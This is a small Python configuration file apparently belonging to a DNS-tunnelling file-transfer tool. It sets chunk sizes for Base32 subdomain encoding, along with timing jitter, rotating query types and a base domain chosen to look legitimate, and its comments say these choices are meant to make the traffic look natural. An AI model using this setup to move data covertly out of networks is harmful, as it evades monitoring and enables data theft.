"""Shared configuration for DNS file transfer via subdomain encoding."""

# DNS labels max 63 chars, subdomains max ~253 chars total.
# Base32 encoding expands data by ~60%, so we keep raw chunk small
# to fit encoded data within DNS label limits.
CHUNK_SIZE = 35
DNS_PORT = 53
HASH_ALGORITHM = "sha256"
METADATA_SEPARATOR = "||"
MAX_RETRIES = 5
SNIFF_TIMEOUT = 60

# Domain to append to encoded data - should look like a real domain
BASE_DOMAIN = "cdn-analytics.com"

# Delay between packets in seconds (jitter range: delay ± jitter)
SEND_DELAY = 0.3
SEND_JITTER = 0.2

# DNS query types to rotate through (looks more natural)
QUERY_TYPES = ["A", "AAAA", "CNAME", "TXT", "MX"]
